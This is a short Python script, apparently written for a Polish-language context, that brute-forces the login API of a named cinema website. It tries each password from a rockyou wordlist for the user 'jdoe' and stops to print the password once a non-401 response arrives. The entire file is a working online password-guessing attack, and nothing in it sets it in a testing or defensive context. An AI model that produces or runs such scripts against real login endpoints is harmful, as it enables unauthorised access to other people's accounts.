import requests

i = 0
with open("./rockyou-10.txt", "r") as f:
    for line in f.readlines():
        i += 1
        if i % 1000 == 0:
            print(i, line)
        r = requests.post(
            "https://cinema.dawidroszman.eu/api/v1/auth/login",
            json={"username": "jdoe", "password": line.strip()},
        )
        if r.status_code != 401:
            print(r.text)
            print(f"Poprawne hasło to {line}")
            break
